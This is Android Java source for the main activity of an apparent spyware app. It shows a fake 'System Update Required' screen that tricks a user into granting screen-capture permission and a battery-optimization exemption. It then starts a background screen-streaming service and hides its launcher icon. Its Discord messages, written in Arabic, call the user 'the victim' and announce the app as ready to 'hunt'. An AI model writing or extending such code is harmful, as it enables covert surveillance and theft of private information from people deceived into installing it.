package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. رسالة تأكيد للديسكورد فور فتح التطبيق
        DiscordSender.sendMessage("🔔 تطبيق حسين اشتغل الآن! الربط بالديسكورد 100% شغال وجاهز للصيد.");

        // بناء واجهة بسيطة برمجياً لمنع كراش الموارد
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.WHITE);

        TextView tv = new TextView(this);
        tv.setText("System Update Required");
        tv.setTextSize(22);
        tv.setTextColor(Color.BLACK);
        tv.setPadding(0, 0, 0, 50);
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("بدء الإصلاح الآن");
        btn.setBackgroundColor(Color.parseColor("#4CAF50"));
        btn.setTextColor(Color.WHITE);
        btn.setOnClickListener(v -> {
            requestBatteryOptimizations();
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
            }
        });
        layout.addView(btn);

        setContentView(layout);
    }

    private void requestBatteryOptimizations() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception e) {}
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            Intent intent = new Intent(this, ScreenService.class);
            intent.putExtra("resCode", resultCode);
            intent.putExtra("resData", data);
            startForegroundService(intent);
            
            DiscordSender.sendMessage("🚀 الضحية أعطى الصلاحيات! بدأ البث المستمر.");
            hideAppIcon();
            finish();
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
